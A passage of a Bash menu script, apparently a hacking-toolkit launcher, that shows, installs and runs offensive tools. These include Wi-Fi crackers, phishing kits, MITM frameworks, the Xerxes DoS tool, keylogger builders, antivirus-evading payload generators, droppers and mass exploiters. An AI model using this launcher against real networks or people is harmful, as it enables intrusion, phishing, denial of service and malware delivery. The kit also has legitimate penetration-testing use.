	then
		echo -e ""$YS" 2"$CE") Wifite                Automated wireless attack tool"
	else
		echo -e ""$RS" 2"$CE") "$RS"Wifite"$CE"               Automated wireless attack tool"
	fi
	if [[ -d /root/wifiphisher ]]
	then
		echo -e ""$YS" 3"$CE") Wifiphisher           Automated phishing attacks against Wi-Fi clients"
	else
		echo -e ""$RS" 3"$CE") "$RS"Wifiphisher"$CE"           Automated phishing attacks against Wi-Fi clients"
	fi
	if [[ -d /root/Zatacker ]]
	then
		echo -e ""$YS" 4"$CE") Zatacker              MITM-NMAP-Mail Spammer..(Install it manually)"
	else
		echo -e ""$RS" 4"$CE") "$RS"Zatacker"$CE"              MITM-NMAP-Mail Spammer..(Install it manually)"
	fi
	if [[ -d /root/morpheus ]]
	then
		echo -e ""$YS" 5"$CE") Morpheus              Automated Ettercap TCP/IP Hijacking Tool"
	else
		echo -e ""$RS" 5"$CE") "$RS"Morpheus"$CE"              Automated Ettercap TCP/IP Hijacking Tool"
	fi
	#~ if [[ -d /root/osrframework ]]
	#~ then
		#~ echo -e ""$YS" 6"$CE") Osrfconsole           Checks usernames-phones to platforms etc.."
	#~ else
		#~ echo -e ""$RS" 6"$CE") "$RS"Osrfconsole"$CE"           Checks usernames-phones to platforms etc.."
	#~ fi
	if [[ -d /root/opensource ]]
	then
		echo -e ""$YS" 6"$CE") Netool-toolkit        MitM pentesting opensource toolkit"
	else
		echo -e ""$RS" 6"$CE") "$RS"Netool-toolkit"$CE"        MitM pentesting opensource toolkit"
	fi
	if [[ -d /root/hakkuframework ]]
	then
		echo -e ""$YS" 7"$CE") Hakku                 Penetration testing tools"
	else
		echo -e ""$RS" 7"$CE") "$RS"Hakku"$CE"                 Penetration testing tools"
	fi
	if [[ -d /root/Trity ]]
	then
		echo -e ""$YS" 8"$CE") Trity                 Advanced pentesting framework"
	else
		echo -e ""$RS" 8"$CE") "$RS"Trity"$CE"                 Advanced pentesting framework"
	fi
	if [[ -d /root/Dracnmap ]]
	then				
		echo -e ""$YS" 9"$CE") Dracnmap              Many scan options"
	else
		echo -e ""$RS" 9"$CE") "$RS"Dracnmap"$CE"              Many scan options"
	fi
	if [[ -d "/usr/share/fern-wifi-cracker" ]]
	then	
		echo -e ""$YS"10"$CE") Fern                  Wifi cracker GUI"
	else
		echo -e ""$RS"10"$CE") "$RS"Fern"$CE"                  Wifi cracker GUI"
	fi
	if [[ -f /usr/sbin/netdiscover ]]
	then	
		echo -e ""$YS"11"$CE") Netdiscover           Network address discovering tool"
	else
		echo -e ""$RS"11"$CE") "$RS"Netdiscover"$CE"           Network address discovering tool"
	fi
	if [[ -d /root/kickthemout ]]
	then	
		echo -e ""$YS"12"$CE") KickThemOut           Kick devices off your network"
	else
		echo -e ""$RS"12"$CE") "$RS"KickThemOut"$CE"           Kick devices off your network"
	fi
	if [[ -d "/usr/share/ghost-phisher" ]]
	then	
		echo -e ""$YS"13"$CE") Ghost-Phisher         Fake AP,MITM,Session hijacking etc..."
	else
		echo -e ""$RS"13"$CE") "$RS"Ghost-Phisher"$CE"         Fake AP,MITM,Session hijacking etc..."
	fi
	if [[ -d /root/The-Eye ]]
	then	
		echo -e ""$YS"14"$CE") The Eye               Detects ARP poisoning DNS spoofing etc..."
	else
		echo -e ""$RS"14"$CE") "$RS"The Eye"$CE"               Detects ARP poisoning DNS spoofing etc..."
	fi
	if [[ -d /root/xerxes ]]
	then	
		echo -e ""$YS"15"$CE") Xerxes                The most powerful DoS tool(CAUTION)"
	else
		echo -e ""$RS"15"$CE") "$RS"Xerxes"$CE"                The most powerful DoS tool(CAUTION)"
	fi
	if [[ -d /root/KatanaFramework ]]
	then
		echo -e ""$YS"16"$CE") Katana Framework      Many penetration testing features"
	else
		echo -e ""$RS"16"$CE") "$RS"Katana Framework"$CE"      Many penetration testing features"
	fi
	if [[ -d /root/airgeddon ]]
	then
		echo -e ""$YS"17"$CE") Airgeddon             Audit wireless networks."
	else
		echo -e ""$RS"17"$CE") "$RS"Airgeddon"$CE"             Audit wireless networks."
	fi
	if [[ -f /usr/bin/websploit ]]
	then
		echo -e ""$YS"18"$CE") Websploit             Advanced MITM framework"
	else
		echo -e ""$RS"18"$CE") "$RS"Websploit"$CE"             Advanced MITM framework"
	fi
	if [[ -d /etc/openvas ]]
	then
		echo -e ""$YS"19"$CE") Openvas               Vulnerability scanner LAN"
	else
		echo -e ""$RS"19"$CE") "$RS"Openvas"$CE"               Vulnerability scanner LAN"
	fi
	if [[ -f /usr/bin/ipscan ]]
	then
		echo -e ""$YS"20"$CE") Angry IP Scanner      IP Scanner"
	else
		echo -e ""$RS"20"$CE") "$RS"Angry IP Scanner"$CE"      IP Scanner"
	fi
	if [[ -d /root/routersploit ]]
	then
		echo -e ""$YS"21"$CE") Routersploit          Find/exploit router vulnerabilities"
	else
		echo -e ""$RS"21"$CE") "$RS"Routersploit"$CE"          Find/exploit router vulnerabilities"
	fi
	if [[ -d /root/nWatch ]]
	then
		echo -e ""$YS"22"$CE") nWatch                IP scanner/OS detection"
	else
		echo -e ""$RS"22"$CE") "$RS"nWatch"$CE"                IP scanner/OS detection"
	fi
	if [[ -d /root/eternal_scanner ]]
	then
		echo -e ""$YS"23"$CE") Eternal scanner       Scans hosts for eternalblue vulnerabilities"
	else
		echo -e ""$RS"23"$CE") "$RS"Eternal scanner"$CE"       Scans hosts for eternalblue vulnerabilities"
	fi
	if [[ -d /root/eaphammer ]]
	then
		echo -e ""$YS"24"$CE") Eaphammer             Evil twin attacks against WPA2-Enterprise networks"
	else
		echo -e ""$RS"24"$CE") "$RS"Eaphammer"$CE"             Evil twin attacks against WPA2-Enterprise networks"
	fi
	if [[ -d /root/VMR ]]
	then
		echo -e ""$YS"25"$CE") VMR                   Best WPS cracker, mdk3-v6"
	else
		echo -e ""$RS"25"$CE") "$RS"VMR"$CE"                   Best WPS cracker, mdk3-v6"
	fi
	if [[ -d /root/netattack2 ]]
	then
		echo -e ""$YS"26"$CE") Netattack3            Advanced network scan and attack script"
	else
		echo -e ""$RS"26"$CE") "$RS"Netattack2"$CE"            Advanced network scan and attack script"
	fi
	if [[ -f /usr/bin/wifi-pumpkin ]]
	then
		echo -e ""$YS"27"$CE") Wifi-Pumpkin          Framework for Rogue Wi-Fi Access Point Attack"
	else
		echo -e ""$RS"27"$CE") "$RS"Wifi-Pumpkin"$CE"          Framework for Rogue Wi-Fi Access Point Attack"
	fi
	if [[ -d /root/Gloom-Framework ]]
	then
		echo -e ""$YS"28"$CE") Gloom                 Penetration Testing Framework"
	else
		echo -e ""$RS"28"$CE") "$RS"Gloom"$CE"                 Penetration Testing Framework"
	fi
	if [[ -f /usr/bin/sechub ]]
	then
		echo -e ""$YS"29"$CE") secHub                Security/Hacking Kit"
	else
		echo -e ""$RS"29"$CE") "$RS"secHub"$CE"                Security/Hacking Kit"
	fi
	if [[ -d /root/SocialFish ]]
	then
		echo -e ""$YS"30"$CE") SocialFish            Ultimate phishing tool with Ngrok integrated"
	else
		echo -e ""$RS"30"$CE") "$RS"SocialFish"$CE"            Ultimate phishing tool with Ngrok integrated"
	fi
	echo -e ""$YS" b"$CE") Go back"
	echo -e ""$YS"00"$CE") Main menu"
	#echo -e ""$YS" 0"$CE") EXIT"
	echo -e "Choose: "
	read -e APPP
	clear
	if [[ "$APPP" = "1" ]]
	then
		if [[ -d /root/fluxion ]]
		then
			cd /root/fluxion
			#~ if [[ -f /root/fluxion/fluxion ]]
			#~ then
				./fluxion*
			#~ elif [[ -f /root/fluxion/fluxion.sh ]]
			#~ then
				#~ ./fluxion.sh
			#~ fi
			cd
		else
			echo -e "$TNI"
			read INSTALL
			if [[ "$INSTALL" = "install" ]]
			then
				install_fluxion
			else
				continue
			fi
		fi
	elif [[ "$APPP" = "2" ]]
	then
		if [[ -f /usr/bin/wifite ]]
		then
			wifite
		else
			echo -e "$TNI"
			read INSTALL
			if [[ "$INSTALL" = "install" ]]
			then
				install_wifite
			else
				continue
			fi
		fi
	elif [[ "$APPP" = "3" ]]
	then
		if [[ -d /root/wifiphisher ]]
		then
			clear
			wifiphisher
		else
			echo -e "$TNI"
			read INSTALL
			if [[ "$INSTALL" = "install" ]]
			then
				install_wifiphisher
			else
				continue
			fi
		fi
	elif [[ "$APPP" = "4" ]]
	then
		if [[ -d /root/Zatacker ]]
		then
			if [[ -d "/root/Zatacker" ]]
			then	
				cd /root/Zatacker
				./ZT.sh
				cd
			else
				echo -e "You have to install it manually since its not on github.Sorry."
				sleep 4
				exec bash "$0"
			fi
		else
			echo -e "$TNI"
			read INSTALL
			if [[ "$INSTALL" = "install" ]]
			then
				install_zatacker
			else
				continue
			fi
		fi
	elif [[ "$APPP" = "5" ]]
	then
		if [[ -d /root/morpheus ]]
		then
			cd /root/morpheus
			./morpheus.sh
			cd
		else
			echo -e "$TNI"
			read INSTALL
			if [[ "$INSTALL" = "install" ]]
			then
				install_morpheus
			else
				continue
			fi
		fi
	elif [[ "$APPP" = "6" ]]
	then
		if [[ -d "/root/opensource" ]]
		then
			cd /root/opensource
			./netool.sh
		else
			echo -e "$TNI"
			read INSTALL
			if [[ "$INSTALL" = "install" ]]
			then
				install_netool
			else
				continue
			fi
		fi
	elif [[ "$APPP" = "7" ]]
	then
		if [[ -d /root/hakkuframework ]]
		then
			echo -e "type: 'show modules' to start"
			sleep 2
			clear
			cd /root/hakkuframework
			./hakku
			cd
		else
			echo -e "$TNI"
			read INSTALL
			if [[ "$INSTALL" = "install" ]]
			then
				install_hakku
			else
				continue
			fi
		fi
	elif [[ "$APPP" = "8" ]]
	then
		if [[ -d /root/Trity ]]
		then
			echo -e "type: 'help' to start"
			sleep 2
			clear
			trity			
		else
			echo -e "$TNI"
			read INSTALL
			if [[ "$INSTALL" = "install" ]]
			then
				install_trity
			else
				continue
			fi
		fi
	elif [[ "$APPP" = "9" ]]
	then
		if [[ -d "/root/Dracnmap" ]]
		then
			cd /root/Dracnmap/
			./dracnmap-v*.sh	
			cd		
		else
			echo -e "$TNI"
			read INSTALL
			if [[ "$INSTALL" = "install" ]]
			then
				install_dracnmap
			else
				continue
			fi
		fi
	elif [[ "$APPP" = "10" ]]
	then
		if [[ -d "/usr/share/fern-wifi-cracker" ]]
		then
			cd /root/Fern-Wifi-Cracker
			python execute.py
			cd
		else
			echo -e "$TNI"
			read INSTALL
			if [[ "$INSTALL" = "install" ]]
			then
				install_fern
			else
				continue
			fi
		fi
	elif [[ "$APPP" = "11" ]]
	then
		if [[ -f /usr/sbin/netdiscover ]]
		then
			echo -e "Range ("$YS"Enter"$CE"=192.168.1.0/24):"
			read NRANGE
			if [[ -z $NRANGE ]]
			then
				NRANGE="192.168.1.0/24"
			fi
			netdiscover -r $NRANGE -i "$WLANN"
		else
			echo -e "$TNI"
			read INSTALL
			if [[ "$INSTALL" = "install" ]]
			then
				install_netdiscover
			else
				continue
			fi
		fi
	elif [[ "$APPP" = "12" ]]
	then
		if [[ -d "/root/kickthemout" ]]
		then
			cd /root/kickthemout
			python kickthemout.py
			cd
		else
			echo -e "$TNI"
			read INSTALL
			if [[ "$INSTALL" = "install" ]]
			then
				install_kickthemout
			else
				continue
			fi
		fi
	elif [[ "$APPP" = "13" ]]
	then
		if [[ -d "/usr/share/ghost-phisher" ]]
		then	
			cd /root/ghost-phisher/Ghost-Phisher
			python ghost.py
			cd
		else
			echo -e "$TNI"
			read INSTALL
			if [[ "$INSTALL" = "install" ]]
			then
				install_ghostphisher
			else
				continue
			fi
		fi
	elif [[ "$APPP" = "14" ]]
	then
		if [[ -d "/root/The-Eye" ]]
		then
			cd /root/The-Eye
			./TheEye
			cd
		else
			echo -e "$TNI"
			read INSTALL
			if [[ "$INSTALL" = "install" ]]
			then
				install_theeye
			else
				continue
			fi
		fi
	elif [[ "$APPP" = "15" ]]
	then
		if [[ -d "/root/xerxes" ]]
		then
			echo -e "Do you own the site you want to DoS?"$YNONLY""
			read DOSTERM
			if [[ "$DOSTERM" = "y" ]]
			then

				clear
				echo -e "Enter your site(e.g: iownthissite.com): "
				echo -e "(without www)"
				read -e SITEDOS
				clear
				echo -e "Launching www.isitdownrightnow.com for $SITEDOS"
				sleep 4
				gio open http://www.isitdownrightnow.com/"$SITEDOS".html
				clear	
				cd /root/xerxes
				SITEDOSX=www.$SITEDOS
				echo -e "Press "$YS"any key"$CE" to start DoS on $SITEDOSX"
				$READAK
				./xerxes $SITEDOSX 80
			else
				clear
				echo -e "Then never try this."
				sleep 3
				exec bash "$0"
			fi
		else
			echo -e "$TNI"
			read INSTALL
			if [[ "$INSTALL" = "install" ]]
			then
				install_xerxes
			else
				continue
			fi
		fi
	elif [[ "$APPP" = "16" ]]
	then
		if [[ -d "/usr/share/KatanaFramework" ]]
		then
			ktf.console
		else
			echo -e "$TNI"
			read INSTALL
			if [[ "$INSTALL" = "install" ]]
			then
				install_katana
			else
				continue
			fi
		fi
	elif [[ "$APPP" = "17" ]]
	then
		if [[ -d "/root/airgeddon" ]]
		then
			cd /root/airgeddon
			./airgeddon.sh
			cd
		else
			echo -e "$TNI"
			read INSTALL
			if [[ "$INSTALL" = "install" ]]
			then
				install_airgeddon
			else
				continue
			fi
		fi
	elif [[ "$APPP" = "18" ]]
	then
		if [[ -d "/usr/share/websploit" ]]
		then
			websploit
		else
			echo -e "$TNI"
			read INSTALL
			if [[ "$INSTALL" = "install" ]]
			then
				install_websploit
			else
				continue
			fi
		fi
	elif [[ "$APPP" = "19" ]]
	then
		if [[ -d /etc/openvas ]]
		then
			echo -e "Start or stop?("$YS"start"$CE"/"$YS"stop"$CE")"
			read -e SORS
			if [[ "$SORS" == "start" ]]
			then
				netstat -nltp
				openvas-start
				echo -e "Launching firefox..."
				sleep 1
				firefox https://127.0.0.1:9392
			else
				openvas-stop
			fi
		else
			echo -e "$TNI"
			read INSTALL
			if [[ "$INSTALL" = "install" ]]
			then
				install_openvas
			else
				continue
			fi
		fi
	elif [[ "$APPP" = "20" ]]
	then
		if [[ -d "/usr/lib/ipscan" ]]
		then
			bash /usr/bin/ipscan & disown
		else
			echo -e "$TNI"
			read INSTALL
			if [[ "$INSTALL" = "install" ]]
			then
				install_angryip
			else
				continue
			fi
		fi
	elif [[ "$APPP" = "21" ]]
	then
		if [[ -d "/root/routersploit" ]]
		then
			cd /root/routersploit
			./rsf.py
			cd
		else
			echo -e "$TNI"
			read INSTALL
			if [[ "$INSTALL" = "install" ]]
			then
				install_routersploit
			else
				continue
			fi
		fi
	elif [[ "$APPP" = "22" ]]
	then
		if [[ -d "/root/nWatch" ]]
		then
			cd /root/nWatch
			python nwatch.py
			cd
		else
			echo -e "$TNI"
			read INSTALL
			if [[ "$INSTALL" = "install" ]]
			then
				install_nwatch
			else
				continue
			fi
		fi
	elif [[ "$APPP" = "23" ]]
	then
		if [[ -d "/root/eternal_scanner" ]]
		then
			cd /root/eternal_scanner
			./escan
			cd
		else
			echo -e "$TNI"
			read INSTALL
			if [[ "$INSTALL" = "install" ]]
			then
				install_eternalscanner
			else
				continue
			fi
		fi
	elif [[ "$APPP" = "24" ]]
	then
		if [[ -d "/root/eaphammer" ]]
		then
			eaphammer_automation
		else
			echo -e "$TNI"
			read INSTALL
			if [[ "$INSTALL" = "install" ]]
			then
				install_eaphammer
			else
				continue
			fi
		fi
		cd
	elif [[ "$APPP" = "25" ]]
	then
		if [[ -d "/root/VMR" ]]
		then
			cd /root/VMR
			./VMR-MDK-K2-2017R-012x2.sh
		else
			echo -e "$TNI"
			read INSTALL
			if [[ "$INSTALL" = "install" ]]
			then
				install_vmr
			else
				continue
			fi
		fi
		cd
	elif [[ "$APPP" = "26" ]]
	then
		if [[ -d "/root/netattack2" ]]
		then
			cd /root/netattack2
			python2 netattack2.py
		else
			echo -e "$TNI"
			read INSTALL
			if [[ "$INSTALL" = "install" ]]
			then
				install_netattack2
			else
				continue
			fi
		fi
		cd
	elif [[ "$APPP" = "27" ]]
	then
		if [[ -f "/usr/bin/wifi-pumpkin" ]]
		then
			wifi-pumpkin
		else
			echo -e "$TNI"
			read INSTALL
			if [[ "$INSTALL" = "install" ]]
			then
				install_wifi_pumpkin
			else
				continue
			fi
		fi
		cd
	elif [[ "$APPP" = "28" ]]
	then
		if [[ -d "/root/Gloom-Framework" ]]
		then
			cd /root/Gloom-Framework
			python gloom.py
		else
			echo -e "$TNI"
			read INSTALL
			if [[ "$INSTALL" = "install" ]]
			then
				install_gloom
			else
				continue
			fi
		fi
		cd
	elif [[ "$APPP" = "29" ]]
	then
		if [[ -f "/usr/bin/sechub" ]]
		then
			sechub
		else
			echo -e "$TNI"
			read INSTALL
			if [[ "$INSTALL" = "install" ]]
			then
				install_sechub
			else
				continue
			fi
		fi
		cd
	elif [[ "$APPP" = "30" ]]
	then
		if [[ -d "/root/SocialFish" ]]
		then
			cd /root/SocialFish
			python SocialFish.py
		else
			echo -e "$TNI"
			read INSTALL
			if [[ "$INSTALL" = "install" ]]
			then
				install_socialfish
			else
				continue
			fi
		fi
		cd
	elif [[ "$APPP" = "7" ]]
	then
		if [[ -d "/root/hakkuframework" ]]
		then
			while true
			do
			printf '\033]2;OSRFCONSOLE\a'
			clear
			echo -e ""$YS" 1"$CE") usufy"
			echo -e ""$YS" 2"$CE") mailfy"
			echo -e ""$YS" 3"$CE") searchfy"
			echo -e ""$YS" 4"$CE") domainfy"
			echo -e ""$YS" 5"$CE") phonefy"
			echo -e ""$YS" 6"$CE") entify"
			echo -e ""$YS" b"$CE") Go back"
			echo -e ""$YS"00"$CE") Main menu"
		#	echo -e ""$YS" 0"$CE") EXIT"
			echo -e "Choose: "
			read -e OSFR
			clear
				if [[ "$OSFR" = "1" ]]
				then
					echo -e "Use: usufy.py -n name1 name2 -p twitter facebook"
					usufy.py
					exit
				elif [[ "$OSFR" = "2" ]]
				then
					echo -e "Use: mailfy.py -n name1"
					mailfy.py
					exit
				elif [[ "$OSFR" = "3" ]]
				then
					searchfy.py
					exit
				elif [[ "$OSFR" = "4" ]]
				then
					domainfy.py
					exit
				elif [[ "$OSFR" = "5" ]]
				then
					phonefy.py
					exit
				elif [[ "$OSFR" = "6" ]]
				then
				entify.py
					exit
				elif [[ "$OSFR" = "0" ]]
				then
					exit
				elif [[ "$OSFR" = "00" ]]
				then
					exec bash "$0"
				elif [[ "$OSFR" = "back" || "$OSFR" = "b" ]]
				then
					break
				else 
					echo -e "Wrong choice"
					sleep 0.3
					clear
					exec bash "$0"
				fi
			done
		else
			echo -e "$TNI"
			read INSTALL
			if [[ "$INSTALL" = "install" ]]
			then
				install_osrframework
			else
				continue
			fi
		fi
	elif [[ "$APPP" = "0" ]]
	then
		clear
		exit
	elif [[ "$APPP" = "00" ]]
	then
		clear
		exec bash "$0"
	elif [[ "$APPP" = "back" || "$APPP" = "b" ]]
	then
		break
	fi
	if [[ "$APPP" != "" ]]
	then
		echo -e "$PAKTGB"
		$READAK
	fi
	done
}
function remote_access
{
	while true 
	do
	clear
	TERMINALTITLE="REMOTE ACCESS"
	dash_calc
	printf '\033]2;REMOTE ACCESS\a'
	if [[ -d /root/BeeLogger ]]
	then
		echo -e ""$YS" 1"$CE") BeeLogger             Generate Gmail Emailing Keyloggers to Windows"
	else
		echo -e ""$RS" 1"$CE") "$RS"BeeLogger"$CE"             Generate Gmail Emailing Keyloggers to Windows"
	fi
	if [[ -d /root/ezsploit ]]
	then
		echo -e ""$YS" 2"$CE") Ezsploit              Automation for metasploit"
	else
		echo -e ""$RS" 2"$CE") "$RS"Ezsploit"$CE"              Automation for metasploit"
	fi
	if [[ -d /root/pupy ]]
	then
		echo -e ""$YS" 3"$CE") Pupy                  Remote administration and post-exploitation tool"
	else
		echo -e ""$RS" 3"$CE") "$RS"Pupy"$CE"                  Remote administration and post-exploitation tool"
	fi
	if [[ -d /root/zirikatu ]]
	then
		echo -e ""$YS" 4"$CE") Zirikatu              Fud Payload generator script"
	else
		echo -e ""$RS" 4"$CE") "$RS"Zirikatu"$CE"              Fud Payload generator script"
	fi
	if [[ -d /root/TheFatRat ]]
	then
		echo -e ""$YS" 5"$CE") TheFatRat             Generate undetectable payloads"
	else
		echo -e ""$RS" 5"$CE") "$RS"TheFatRat"$CE"             Generate undetectable payloads"
	fi
	if [[ -d /root/Winpayloads ]]
	then
		echo -e ""$YS" 6"$CE") Winpayloads           Generate undetectable payloads"
	else
		echo -e ""$RS" 6"$CE") "$RS"Winpayloads"$CE"           Generate undetectable payloads"
	fi
	if [[ -f /usr/bin/shellter ]]
	then
		echo -e ""$YS" 7"$CE") Shellter              Inject payload into .exe"
	else
		echo -e ""$RS" 7"$CE") "$RS"Shellter"$CE"              Inject payload into .exe"
	fi
	if [[ -d /root/CHAOS ]]
	then
		echo -e ""$YS" 8"$CE") CHAOS                 Generate payloads/listeners"
	else
		echo -e ""$RS" 8"$CE") "$RS"CHAOS"$CE"                 Generate payloads/listeners"
	fi
	if [[ -d /root/kwetza ]]
	then
		echo -e ""$YS" 9"$CE") Kwetza                Inject payload to apk"
	else
		echo -e ""$RS" 9"$CE") "$RS"Kwetza"$CE"                Inject payload to apk"
	fi
	if [[ -d /root/koadic ]]
	then
		echo -e ""$YS"10"$CE") Koadic                Windows post-exploitation rootkit"
	else
		echo -e ""$RS"10"$CE") "$RS"Koadic"$CE"                Windows post-exploitation rootkit"
	fi
	if [[ -d /root/Empire ]]
	then
		echo -e ""$YS"11"$CE") Empire                PowerShell and Python post-exploitation agent"
	else
		echo -e ""$RS"11"$CE") "$RS"Empire"$CE"                PowerShell and Python post-exploitation agent"
	fi
	if [[ -d /root/Meterpreter_Paranoid_Mode-SSL ]]
	then
		echo -e ""$YS"12"$CE") Meterpreter Paranoid  Meterpreter Paranoid Mode - SSL/TLS connections"
	else
		echo -e ""$RS"12"$CE") "$RS"Meterpreter Paranoid"$CE"  Meterpreter Paranoid Mode - SSL/TLS connections"
	fi
	if [[ -d /root/Dr0p1t-Framework ]]
	then
		echo -e ""$YS"13"$CE") Dr0p1t-Framework      Create an advanced stealthy dropper"
	else
		echo -e ""$RS"13"$CE") "$RS"Dr0p1t-Framework"$CE"      Create an advanced stealthy dropper"
	fi
	if [[ -d /root/Veil ]]
	then
		echo -e ""$YS"14"$CE") Veil-Framework        Generate payloads that bypass common anti-virus"
	else
		echo -e ""$RS"14"$CE") "$RS"Veil-Framework"$CE"        Generate payloads that bypass common anti-virus"
	fi
	if [[ -d /root/leviathan ]]
	then
		echo -e ""$YS"15"$CE") Leviathan             Wide range mass audit toolkit"
	else
		echo -e ""$RS"15"$CE") "$RS"Leviathan"$CE"             Wide range mass audit toolkit"
	fi
	if [[ -d /root/FakeImageExploiter ]]
	then
		echo -e ""$YS"16"$CE") FakeImageExploiter    Use a Fake image.jpg to exploit targets"
	else
		echo -e ""$RS"16"$CE") "$RS"FakeImageExploiter"$CE"    Use a Fake image.jpg to exploit targets"
	fi
	if [[ -d /root/avet ]]
	then
		echo -e ""$YS"17"$CE") Avet                  AntiVirus Evasion Tool"
	else
		echo -e ""$RS"17"$CE") "$RS"Avet"$CE"                  AntiVirus Evasion Tool"
	fi
	if [[ -d /root/ARCANUS ]]
	then
		echo -e ""$YS"18"$CE") Arcanus               Customized payload generator/handler"
	else
		echo -e ""$RS"18"$CE") "$RS"Arcanus"$CE"               Customized payload generator/handler"
	fi
	if [[ -f /usr/bin/msfpc ]]
	then
		echo -e ""$YS"19"$CE") MSFPC                 MSFvenom Payload Creator"
	else
		echo -e ""$RS"19"$CE") "$RS"MSFPC"$CE"                 MSFvenom Payload Creator"
	fi
	if [[ -d /root/morphHTA ]]
	then
		echo -e ""$YS"20"$CE") morphHTA              Morphing Cobalt Strike's evil.HTA"
	else
		echo -e ""$RS"20"$CE") "$RS"morphHTA"$CE"              Morphing Cobalt Strike's evil.HTA"
	fi
	if [[ -d /root/LFISuite ]]
	then
		echo -e ""$YS"21"$CE") LFISuite              Totally Automatic LFI Exploiter and Scanner"
	else
		echo -e ""$RS"21"$CE") "$RS"LFISuite"$CE"              Totally Automatic LFI Exploiter and Scanner"
	fi
	if [[ -d /root/UniByAv ]]
	then
		echo -e ""$YS"22"$CE") UniByAv               Generate undetectable executable from raw shellcode"
	else
		echo -e ""$RS"22"$CE") "$RS"UniByAv"$CE"               Generate undetectable executable from raw shellcode"
	fi
	if [[ -d /root/demiguise ]]
	then
		echo -e ""$YS"23"$CE") Demiguise             HTA encryption tool for RedTeams"
	else
		echo -e ""$RS"23"$CE") "$RS"Demiguise"$CE"              HTA encryption tool for RedTeams"
	fi
	if [[ -d /root/DKMC ]]
	then
		echo -e ""$YS"24"$CE") DKMC                  Malicious payload evasion tool into image"
	else
		echo -e ""$RS"24"$CE") "$RS"DKMC"$CE"                   Malicious payload evasion tool into image"
	fi
	if [[ -d /usr/share/beef-xss ]]
	then
		echo -e ""$YS"25"$CE") Beef                  The browser exploitation framework"
	else
		echo -e ""$RS"25"$CE") "$RS"Beef"$CE"                   The browser exploitation framework"
	fi
	if [[ -d /root/Evil-Droid ]]
	then
		echo -e ""$YS"26"$CE") Evil-Droid            Penetrate android platforms"
	else
		echo -e ""$RS"26"$CE") "$RS"Evil-Droid"$CE"             Penetrate android platforms"
	fi
	if [[ -d /root/EggShell ]]
	then
		echo -e ""$YS"27"$CE") EggShell              Penetrate android platforms"
	else
		echo -e ""$RS"27"$CE") "$RS"EggShell"$CE"               Penetrate android platforms"
	fi
	if [[ -d /root/Zerodoor ]]
	then
		echo -e ""$YS"28"$CE") Zerodoor              Penetrate android platforms"
	else
		echo -e ""$RS"28"$CE") "$RS"Zerodoor"$CE"               Penetrate android platforms"
	fi
	if [[ -d /root/cromos ]]
	then
		echo -e ""$YS"29"$CE") Cromos                Download and Inject code into Google Chrome extensions"
	else
		echo -e ""$RS"29"$CE") "$RS"Cromos"$CE"                 Download and Inject code into Google Chrome extensions"
	fi
	if [[ -d /root/AutoSploit ]]
	then
		echo -e ""$YS"30"$CE") AutoSploit            Automated Mass Exploiter"
	else
		echo -e ""$RS"30"$CE") "$RS"AutoSploit"$CE"             Automated Mass Exploiter"
	fi
	if [[ -d /root/Enigma ]]
	then
		echo -e ""$YS"31"$CE") Enigma                Multiplatform payload dropper"
	else
		echo -e ""$RS"31"$CE") "$RS"Enigma"$CE"                 Multiplatform payload dropper"
	fi
	echo -e ""$YS" b"$CE") Go back"
	echo -e ""$YS"00"$CE") Main menu"
	#echo -e ""$YS" 0"$CE") EXIT"
	echo -e "Choose: "
	read -e KEYLOG
	clear
	if [[ "$KEYLOG" = "1" ]]
	then
		if [[ -d /root/BeeLogger ]]
		then
			cd /root/BeeLogger
			python bee.py
			cd
		else
			echo -e "$TNI"
			read INSTALL
			if [[ "$INSTALL" = "install" ]]
			then
				install_beelogger
			else
				continue
			fi
		fi
	elif [[ "$KEYLOG" = "10" ]]
	then
		if [[ -d /root/koadic ]]
		then
			cd /root/koadic
			./koadic
		else
			echo -e "$TNI"
			read INSTALL
			if [[ "$INSTALL" = "install" ]]
			then
				install_koadic
			else
				continue
			fi
		fi
	elif [[ "$KEYLOG" = "11" ]]
	then
		if [[ -d /root/Empire ]]
		then
			cd /root/Empire
			./empire
		else
			echo -e "$TNI"
			read INSTALL
			if [[ "$INSTALL" = "install" ]]
			then
				install_empire
			else
				continue
			fi
		fi	
	elif [[ "$KEYLOG" = "12" ]]
	then
		if [[ -d /root/Meterpreter_Paranoid_Mode-SSL ]]
		then
			cd /root/Meterpreter_Paranoid_Mode-SSL
			./Meterpreter_Paranoid_Mode.sh
		else
			echo -e "$TNI"
			read INSTALL
			if [[ "$INSTALL" = "install" ]]
			then
				install_meterpreter_paranoid_mode
			else
				continue
			fi
		fi	
	elif [[ "$KEYLOG" = "13" ]]
	then
		if [[ -d /root/Dr0p1t-Framework ]]
		then
			cd /root/Dr0p1t-Framework
			dropit_automation
		else
			echo -e "$TNI"
			read INSTALL
			if [[ "$INSTALL" = "install" ]]
			then
				install_dropit_frmw
			else
				continue
			fi
		fi	
	elif [[ "$KEYLOG" = "14" ]]
	then
		if [[ -d /root/Veil ]]
		then
			cd /root/Veil
			./Veil.py
		else
			echo -e "$TNI"
			read INSTALL
			if [[ "$INSTALL" = "install" ]]
			then
				install_veil
			else
				continue
			fi
		fi
	elif [[ "$KEYLOG" = "15" ]]
	then
		if [[ -d /root/leviathan ]]
		then
			cd /root/leviathan
			python leviathan.py
		else
			echo -e "$TNI"
			read INSTALL
			if [[ "$INSTALL" = "install" ]]
			then
				install_leviathan
			else
				continue
			fi
		fi	
	elif [[ "$KEYLOG" = "16" ]]
	then
		if [[ -d /root/FakeImageExploiter ]]
		then
			cd /root/FakeImageExploiter
			nano settings
			./FakeImageExploiter.sh
		else
			echo -e "$TNI"
			read INSTALL
			if [[ "$INSTALL" = "install" ]]
			then
				install_fake_image
			else
				continue
			fi
		fi	
	elif [[ "$KEYLOG" = "17" ]]
	then
		if [[ -d /root/avet ]]
		then
			cd /root/avet/build
			ls -1 build*
			echo -e ""
			echo -e "Type which one you want: "
			read AVE
			if [[ ! -f /root/avet/build/"$AVE" ]]
			then
				echo -e ""$RS"File not found"$CE""
				sleep 2
			else
				nano /root/avet/build/"$AVE"
				echo -e "$PAKTC"
				$READAK
				cd /root/avet
				./build/"$AVE"
				gio open /root/avet
			fi
		else
			echo -e "$TNI"
			read INSTALL
			if [[ "$INSTALL" = "install" ]]
			then
				install_avet
			else
				continue
			fi
		fi	
	elif [[ "$KEYLOG" = "18" ]]
	then
		if [[ -d /root/ARCANUS ]]
		then
			cd /root/ARCANUS
			gnome-terminal -e "./ARCANUS & disown"
		else	
			echo -e "$TNI"
			read INSTALL
			if [[ "$INSTALL" = "install" ]]
			then
				install_arcanus
			else
				continue
			fi
		fi	
	elif [[ "$KEYLOG" = "19" ]]
	then
